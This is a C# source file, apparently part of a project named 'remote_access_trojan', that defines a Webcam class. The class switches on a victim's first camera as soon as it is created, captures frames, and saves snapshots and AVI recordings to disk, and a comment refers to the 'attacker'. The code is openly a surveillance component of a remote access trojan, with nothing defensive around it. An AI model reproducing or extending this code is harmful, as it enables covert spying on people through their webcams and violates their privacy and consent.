using System;
using System.IO;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using AForge;
using AForge.Video;
using AForge.Video.DirectShow;
using Accord.Video.FFMPEG;

namespace remote_access_trojan
{
    class Webcam
    {
        //variables for accessing wecam and using it
        private FilterInfoCollection webcam = new FilterInfoCollection(FilterCategory.VideoInputDevice);
        private VideoCaptureDevice capture = null;
        private Bitmap bit = null;
        private VideoFileWriter writer;
        private int index;//represents file number

        public Webcam()
        {
            capture = new VideoCaptureDevice(webcam[0].MonikerString);
            capture.NewFrame += new NewFrameEventHandler(capture_NewFrame);
            capture.Start();
        }

        //Turns on the camera
        public void StartVideo()
        {
            //begin recording
            writer = new VideoFileWriter();
            writer.Open(Path.Combine(Directory.GetCurrentDirectory(), "webcam-vid" + index + ".avi"), (int)Math.Round((double)bit.Width, 0), (int)Math.Round((double)bit.Height, 0));
        }
        
        public void StopVideo()
        {
            writer.Close();
            StopWebcam();
        }
        //cam_NewFram handler
        private void capture_NewFrame(object sender, NewFrameEventArgs eventArgs)
        {
            bit = (Bitmap)eventArgs.Frame.Clone();
        }

        //Takes a screenshot and allows attacker to save where they want
        public void TakePicture(int index)
        {
            if (bit != null)
                bit.Save(Path.Combine(Directory.GetCurrentDirectory(), "webcam-pic" + index + ".png"));
        }

        //Stops the camera
        private void StopWebcam()
        {
            if (capture != null && capture.IsRunning)
                capture.Stop();
        }
    }
}
